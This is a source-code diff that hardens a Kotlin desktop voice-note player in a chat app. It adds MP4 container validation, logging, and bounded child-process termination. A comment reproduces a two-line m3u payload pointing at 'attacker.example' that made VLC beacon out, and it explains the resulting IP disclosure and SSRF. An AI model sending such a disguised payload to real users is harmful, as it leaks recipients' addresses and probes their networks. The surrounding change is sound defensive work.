@@ -3,12 +3,13 @@ package chat.bitchat.sonar
 import java.io.File
 import java.util.concurrent.ExecutorService
 import java.util.concurrent.Executors
+import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
 
 /**
  * Desktop (JVM) `actual`: recording is not wired yet (no JVM AAC encoder).
- * Playback: macOS uses `afplay` on a temp `.m4a` so received voice notes (including
- * Hermes/agent AAC) are audible in Compose Desktop / Sonar.app.
+ * Playback shells out to an installed decoder over a temp `.m4a`; see
+ * [AudioNotePlayer.LINUX_PLAYERS] for which ones and why.
  */
 actual class VoiceRecorder {
     actual suspend fun start(): Boolean = false
@@ -107,33 +108,59 @@ actual object AudioNotePlayer {
     private val isMac = osName.contains("mac")
     private val isLinux = osName.contains("linux")
 
-    // Resolved `[binary] + flags` for this host, or null if nothing can play.
-    // A resettable cache rather than `by lazy`: an object-scoped lazy resolves once
-    // per JVM, so a test could never re-resolve after pointing PATH somewhere else,
-    // and would silently assert against whatever the first caller happened to see.
-    @Volatile private var commandCache: List<String>? = null
-    @Volatile private var commandResolved = false
+    /** `PATH` for player lookup. Tests point this at a directory of stubs. */
+    @Volatile
+    internal var searchPath: String? = null
 
-    internal fun resetPlayerCacheForTest() {
-        synchronized(lock) { commandCache = null; commandResolved = false }
-    }
-
+    // Deliberately NOT cached. The scan is ~10 stat calls with no fork, and caching
+    // it cost more than it saved: it needed a reset hatch purely so tests could
+    // re-resolve, it put that scan on the Compose thread under the playback lock,
+    // and it meant a user who followed the "install ffmpeg" message kept seeing that
+    // message until they restarted the app. Re-probing makes the fix take effect.
     private val playerCommand: List<String>?
-        get() = synchronized(lock) {
-            if (!commandResolved) {
-                commandCache = resolvePlayer()
-                commandResolved = true
+        get() = when {
+            // macOS keeps the absolute path first. `afplay` ships with the OS at a
+            // SIP-protected location and does not move, so resolving it through
+            // `PATH` would only add a way for an earlier entry to win.
+            isMac -> listOf("/usr/bin/afplay").takeIf { File(it[0]).canExecute() }
+                ?: DesktopExec.which("afplay", pathOrDefault())?.let { listOf(it) }
+            isLinux -> LINUX_PLAYERS.firstNotNullOfOrNull { (bin, flags) ->
+                DesktopExec.which(bin, pathOrDefault())?.let { listOf(it) + flags }
             }
-            commandCache
+            else -> null
         }
 
-    private fun resolvePlayer(): List<String>? = when {
-        isMac -> DesktopExec.which("afplay")?.let { listOf(it) }
-        isLinux -> LINUX_PLAYERS.firstNotNullOfOrNull { (bin, flags) ->
-            DesktopExec.which(bin)?.let { listOf(it) + flags }
-        }
-        else -> null
-    }
+    private fun pathOrDefault(): String? = searchPath ?: System.getenv("PATH")
+
+    /**
+     * Whether these bytes are the MP4/M4A container a voice note is supposed to be.
+     *
+     * Sender-declared MIME is not evidence. The routing that reaches playback keys
+     * off `mimeType.startsWith("audio/")` from the peer, and the payload is attacker
+     * controlled end to end, so without this the peer chooses what an external media
+     * stack parses.
+     *
+     * That is not theoretical. VLC content-sniffs and ignores the `.m4a` suffix, so a
+     * "voice note" whose bytes are one line of m3u:
+     *
+     *     #EXTM3U
+     *     http://attacker.example/beacon
+     *
+     * made `cvlc` fetch that URL and exit 0, which the app then reported as a normal
+     * play. On a relay-mediated transport where the sender never otherwise learns the
+     * recipient's IP, that converts a message into an IP disclosure, an exact
+     * read-receipt oracle, and a blind SSRF probe into the victim's LAN. Reproduced
+     * against a local listener with this PR's exact flags; `ffplay` refused it
+     * (libavformat's file-protocol whitelist is `file,crypto,data`).
+     *
+     * Checked here rather than by dropping `cvlc`, because the next player added
+     * would reintroduce it, and because it also stops a malformed payload from
+     * reaching a decoder at all.
+     */
+    internal fun looksLikeMp4(bytes: ByteArray): Boolean =
+        bytes.size >= 12 &&
+            bytes[4] == 'f'.code.toByte() && bytes[5] == 't'.code.toByte() &&
+            bytes[6] == 'y'.code.toByte() && bytes[7] == 'p'.code.toByte()
 
     /**
      * Null when voice notes are playable here, otherwise why they are not.
@@ -151,6 +178,11 @@ actual object AudioNotePlayer {
     }
 
     actual fun play(bytes: ByteArray, onComplete: () -> Unit) {
+        if (!looksLikeMp4(bytes)) {
+            sonarLog("AudioNotePlayer", "refusing to play: payload is not an MP4/M4A container")
+            onComplete()
+            return
+        }
         val command = playerCommand
         if (command == null) {
             // No player: fire the completion so the bubble does not hang on Pause.
@@ -167,7 +199,11 @@ actual object AudioNotePlayer {
             // startup sweep — so an interrupted play cannot leave decrypted E2EE audio.
             val file = runCatching {
                 File.createTempFile(TMP_PREFIX, TMP_SUFFIX)
-            }.getOrElse { onComplete(); return@execute }
+            }.getOrElse {
+                sonarLog("AudioNotePlayer", "could not create the temp note file")
+                onComplete()
+                return@execute
+            }
             // Tighten BEFORE the bytes land, never after. `File.createTempFile`
             // honors the umask, so under a common 0002 it yields rw-rw-r-- and this
             // note is decrypted end-to-end-encrypted audio sitting readable by every
@@ -182,7 +218,8 @@ actual object AudioNotePlayer {
             }
             try {
                 file.writeBytes(bytes)
-            } catch (_: Exception) {
+            } catch (e: Exception) {
+                sonarLog("AudioNotePlayer", "could not write the temp note file: $e")
                 file.delete()
                 onComplete()
                 return@execute
@@ -193,6 +230,9 @@ actual object AudioNotePlayer {
                     .redirectError(ProcessBuilder.Redirect.DISCARD)
                     .start()
             }.getOrElse {
+                // Resolution and spawn are not atomic: a package upgrade between
+                // them, or a PATH entry that is not actually runnable, lands here.
+                sonarLog("AudioNotePlayer", "could not spawn ${command.first()}: $it")
                 file.delete()
                 onComplete()
                 return@execute
@@ -247,8 +287,18 @@ actual object AudioNotePlayer {
         }
         if (p != null) {
             runCatching { p.destroy() }
-            runCatching { p.waitFor() }
+            // Bounded, then SIGKILL. `waitFor()` with no timeout ran on the single
+            // control thread, so a child that ignores SIGTERM wedged it forever: the
+            // decrypted note below was never deleted, the bubble stayed on Pause,
+            // and every later play()/stop() queued behind it for the rest of the
+            // session. A player fed an endless attacker-controlled stream is exactly
+            // such a child.
+            runCatching {
+                if (!p.waitFor(2, TimeUnit.SECONDS)) p.destroyForcibly()
+            }.onFailure { runCatching { p.destroyForcibly() } }
         }
+        // Outside the `p != null` branch and after the kill: dropping the plaintext
+        // must not be reachable only on paths where the child cooperated.
         f?.let { runCatching { it.delete() } }
         cb?.invoke()
     }
